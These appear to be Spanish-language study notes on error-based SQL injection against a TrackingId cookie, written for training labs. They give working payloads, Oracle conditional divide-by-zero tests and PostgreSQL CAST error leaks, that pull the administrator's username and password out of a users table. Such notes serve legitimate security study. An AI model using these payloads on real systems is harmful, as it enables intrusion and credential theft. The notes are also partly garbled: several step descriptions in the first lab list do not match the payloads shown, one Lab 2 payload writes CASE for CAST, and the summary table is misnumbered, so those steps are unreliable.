# Inyección SQL basada en errores — Apuntes con marcadores para comandos

---

## Qué es

La inyección SQL basada en errores aprovecha la aparición de errores SQL (mensajes de error, cambios en la respuesta HTTP, códigos de estado) para **inferir** información de la base de datos cuando la aplicación no devuelve directamente los resultados de una consulta.

---

## Idea general (alto nivel)

* Provocar un **error controlado** en la base de datos únicamente si se cumple una condición.
* Si la aplicación muestra o refleja ese error, o si su comportamiento cambia (código HTTP, contenido, cabeceras), se puede inferir que la condición evaluada es verdadera.
* Repetir esto con condiciones cada vez más específicas permite **recuperar información** paso a paso (existencia de tablas, longitud de campos, carácter por carácter).

---


Para ver cómo funciona esto, supongamos que se envían dos solicitudes que contienen lo siguiente TrackingId valores de cookies a su vez:

``` bash xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
Estas entradas utilizan el CASE palabra clave para probar una condición y devolver una expresión diferente dependiendo de si la expresión es verdadera:

Con la primera entrada, el CASE la expresión se evalúa como 'a', lo que no provoca ningún error.
Con la segunda entrada, se evalúa como 1/0, lo que provoca un error de división por cero.
```
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```


## Laboratorio — pasos generales (marcadores donde irían los comandos)

1. Interceptar la solicitud que contiene la cookie o parámetro vulnerable.
   **TrackingId=xyz'** (valor original de la cookie / modificación inicial).

2. Comprobar respuesta ante una entrada que provoque un error sintáctico.
   **TrackingId=xyz'||(SELECT '')||'** (prueba de comilla simple/desbalanceada).

3. En entornos con motores que requieren tabla (por ejemplo Oracle), construir una subconsulta válida que incluya una tabla conocida o la tabla `dual`.
   **TrackingId=xyz'||(SELECT '' FROM dual)||'** (subconsulta de comprobación con tabla predecible).

4. Consultar una tabla inexistente para verificar que la inyección se procesa como SQL (debe devolver un error distintivo).
   **TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'** (consulta contra tabla inexistente).

5. Verificar existencia de tablas concretas asegurando que la subconsulta sea escalar (p. ej. limitando filas).
   **AQUÍ VAN LOS COMANDOS** (consulta de comprobación de existencia de tabla con limitación a 1 fila).

6. Probar condiciones condicionales que generen error solo si la condición es verdadera (p. ej. mediante expresiones condicionales del motor).
   **TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'** (casos condicionantes con error controlado).

7. Extraer longitud de un campo probando iterativamente (aumentando umbral) y observar cuándo la condición deja de producir error.
   **TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'** (pruebas de longitud).

8. Extraer carácter a carácter utilizando una herramienta de automatización en laboratorio (p. ej. Burp Intruder) y un conjunto de cargas útiles definido.
   **TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'** (configuración de Intruder y marcador de payload).

9. Usar la información obtenida para el objetivo del laboratorio (p. ej. autenticación en entorno de práctica).
   **TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'** (uso final en lab).

---

## Precauciones y condiciones necesarias (conceptual)

* Asegúrate de trabajar **solo** en entornos autorizados.
* Comprueba si las subconsultas deben devolver una sola fila (subconsultas escalares).
* Evita mezclar tipos incompatibles en la misma expresión para no provocar errores no informativos.
* Conoce la sintaxis y las funciones del motor de base de datos del laboratorio (SUBSTR/SUBSTRING, LIMIT, ROWNUM, etc.).

---


## Mensajes de error SQL detallados

Al insertar algo en una consulta esta puede dar un error que contengan muchos detalles : Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
Aqui muesta la conuta completa que la aplicaion hace.

Ocasionalmente, se puede inducir a la aplicacion para que genere mensaje de error que contenga algunos datos devueltos por la consulta. 
Utilizar el CAST() permite combertir un tipo de datos a otro.
```Ejemplo : CAST((SELECT exemple_column FROM example_table) AS int)```
Usualmente los datos que se intentan leer son una cadena. Esto convierte a un tipo de datos incompatible, como un int, puede probocar un error como : 
ERROR: invalid input syntax for type integer: "Example data"

# 🧪 LAB 2 — Inyección SQL Basada en Errores

## Objetivo

Identificar y explotar un punto vulnerable en el parámetro `TrackingId` para provocar errores que revelen información sensible de la base de datos (usuarios y contraseñas).

---

## 1️⃣ Probar error inicial

```bash
TrackingId=Wn5WKnuRUukahftF
```

* **Resultado esperado:** La aplicación responde normalmente, sin error visible.
* **Propósito:** Confirmar que el parámetro es funcional.

---

## 2️⃣ Comprobar si los errores se pueden suprimir con comentario

```bash
TrackingId=Wn5WKnuRUukahftF'--
```

* **Resultado esperado:** No debería devolver error.
* **Interpretación:** Si el error desaparece, el parámetro es vulnerable a inyección SQL basada en comillas.

---

## 3️⃣ Probar con una expresión `AND`

```bash
TrackingId=Wn5WKnuRUukahftF' AND CAST((SELECT 1) AS int)--
```

* **Resultado:**
  `ERROR: argument of AND must be type boolean, not type integer`
* **Interpretación:** El servidor está revelando detalles del motor SQL → **confirmación de vulnerabilidad**.

---

## 4️⃣ Ajustar expresión a tipo booleano

```bash
TrackingId=Wn5WKnuRUukahftF' AND 1=CAST((SELECT 1) AS int)--
```

* **Resultado esperado:** Sin error.
* **Conclusión:** La expresión se evalúa correctamente → el payload se ejecuta dentro de la consulta SQL.

---

## 5️⃣ Intentar extraer nombres de usuario (prueba inicial)

```bash
TrackingId=' AND 1=CASE((SELECT username FROM users) AS int)--
```

* **Posibles resultados:**

  * `ERROR: invalid input syntax for type integer: "administrator"`
  * `ERROR: more than one row returned by a subquery used as an expression`
* **Interpretación:**
  El error confirma que el subquery se ejecuta correctamente, pero devuelve varias filas o devuelve un valor no convertible a entero.

---

## 6️⃣ Reducir espacio: eliminar parte del TrackingId

```bash
TrackingId='
```

* **Observación:** Devuelve un error que sugiere que la consulta se ha ejecutado pero el resultado produjo un tipo/valor inesperado:
  `ERROR: more than one row returned by a subquery used as an expression`

---

## 7️⃣ Forzar la subconsulta a devolver una sola fila (`LIMIT 1`)

```bash
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

* **Resultado:**
  `ERROR: invalid input syntax for type integer: "administrator"`
* **Conclusión:**
  ✅ El error revela el **primer nombre de usuario** (`administrator`).

---

## 8️⃣ Repetir para la contraseña

➡️ **Aquí van los comandos para la contraseña**, repitiendo la estructura anterior pero apuntando a la columna `password`.

Ejemplo de plantilla (rellenar/completar con tus comandos):

```bash
# Aquí van los comandos
# Ejemplo: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

---

##  Resumen del proceso

| Paso | Acción                        | Resultado                    | Conclusión                         |
| ---- | ----------------------------- | ---------------------------- | ---------------------------------- |
| 1    | Probar `TrackingId` normal    | Sin error                    | Parámetro válido                   |
| 2    | Añadir `'--`                  | Sin error                    | Vulnerable a inyección             |
| 3    | `AND CAST((SELECT 1) AS int)` | Error de tipo                | SQL ejecutado                      |
| 4    | Corregir a booleano           | Sin error                    | Validación pasada                  |
| 5    | Extraer `username`            | Error revela múltiples filas | Subquery ejecutada                 |
| 6    | Añadir `LIMIT 1`              | Error con valor literal      | Usuario encontrado                 |
| 7    | Repetir con `password`        | —                            | Contraseña revelada (si se aplica) |

---

